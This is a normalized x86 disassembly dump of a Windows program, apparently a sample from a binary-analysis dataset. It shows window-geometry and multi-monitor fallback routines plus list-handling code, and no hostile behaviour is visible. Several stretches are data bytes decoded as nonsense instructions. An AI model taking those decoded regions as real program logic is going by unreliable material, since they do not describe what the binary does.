push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42b014
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42aea4
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42b0a4
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42aea4
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42b014
sub_42b13a
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42aea4
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_42b1bb
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42aea4
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42b2a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42aea4
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42b37c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42aea4
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42b450
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42aea4
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42b5eb
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42b611
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b618
retn
sub_42b62c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b651
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b658
retn
sub_42b664
push 0xf0042b6
or eax 0x6c654849
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
and al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b658
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
mov eax 0xc0042
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0xb6d07265
inc edx
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
call esp
mov dh 0x42
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11247265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
add [ eax ] al
add [ eax + edi * 4 ] cl
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 4 ] cl
inc edx
add [ eax + eax ] cl
outsb
je r-xdata
js r-xdata
adc [ edi + 0x130f0042 ] dh
dec ecx
inc ebp
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
mov bh 0x42
outsb
je r-xdata
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x42b6a0c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ eax + esi * 2 + 0x33d80040 ] cl
inc eax
add ah ah
xor eax [ eax ]
call 0xffffffffec42f82c
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0xb70c7265
inc edx
add [ ecx ] al
xchg bx ax
cld
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
outsb
je r-xdata
mov eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ eax + 0xc0042 ] 0x0
add bh bh
dec [ ebx + 0x42b78cc0 ]
mov bh 0x42
add bh bh
dec [ edi + esi * 4 + 0x42 ]
jns r-xdata
add al al
dec edi
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
mov dh 0x42
insd
and al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x42b710c0 ]
add [ edi ] cl
imul ebp [ edi + 0x6e ] 0x7000408d
mov eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
jae r-xdata
push esi
je r-xdata
add eax 0xffffffd8
jmp sub_42c51c
inc eax
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
xor [ ecx ] 0x40
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al dl
mov dh 0x42
jo r-xdata
cmp cl [ ecx ]
xor eax [ eax ]
loopne r-xdata
inc eax
add al bl
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
add [ eax - 0x27ffbff0 ] dh
xor eax [ eax ]
in al 0x33
inc eax
add al ch
xor eax [ eax ]
in al dx
xor eax [ eax ]
loopne r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0xc0042b8 ] al
add [ eax ] al
inc edx
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
or al 0xb8
add bh bh
dec [ ebp - 0x47f3ffc0 ]
add [ eax + eax ] al
inc edx
insd
inc ebp
js r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42c3f7
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
int3
mov eax eax
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c3fe
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_40499c
lea eax [ ebp - 0x8 ]
call sub_40578c
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057d0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42aad0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057a4
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057d0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42ba28
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42ba9e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42bbb4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4057a4
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42baa5
lea eax [ ebp - 0x8 ]
call sub_40578c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bb40
mov [ rw-data ] eax
sub_42baac
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bb40
mov [ rw-data ] eax
mov ecx r-xdata
call sub_4057d0
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42bb04
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4057a4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_42bb40
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403160
mov dl 0x1
mov eax [ r-xdata ]
call sub_42aa94
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42aa94
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42aa94
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403f20
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_42bbb4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42bcb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bb04
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42aae4
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_40578c
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d1e0
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_40578c
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d1e0
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bb04
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42aae4
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bb04
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42aae4
mov ecx r-xdata
call sub_4057d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bcbc
lea eax [ ebp - 0xc ]
call sub_40578c
lea eax [ ebp - 0x8 ]
call sub_40578c
retn
sub edx 0xfffffff8
sub_42bcd4
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_42aad0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42bd14
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_42aad0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42bd44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42bed6
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_42aad0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42be71
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bedd
lea eax [ ebp - 0x10 ]
call sub_403f20
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42aad0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
mov eax esi
xor edx edx
call sub_42aad0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42aad0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403190
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_42aad0
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42bee4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42bfc9
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403f74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bfd0
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_40499c
lea eax [ ebp - 0x8 ]
call sub_40578c
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42aad0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057a4
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057d0
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42aad0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4057a4
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057d0
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42bfec
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x20 ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42c1f1
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor edi edi
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x24
mov edx ebx
call sub_403f74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c1f8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
test edi edi
jne r-xdata
inc ebx
xor esi esi
cmp edi 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4043e0
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x6
lea eax [ ebp - 0x2c ]
push eax
push 0x0
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
inc esi
dec ebx
jne r-xdata
mov [ ebp - 0x10 ] esi
inc edi
dec edi
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_42aad0
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx esi
call sub_42aad0
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
inc ebx
xor esi esi
xor edx edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
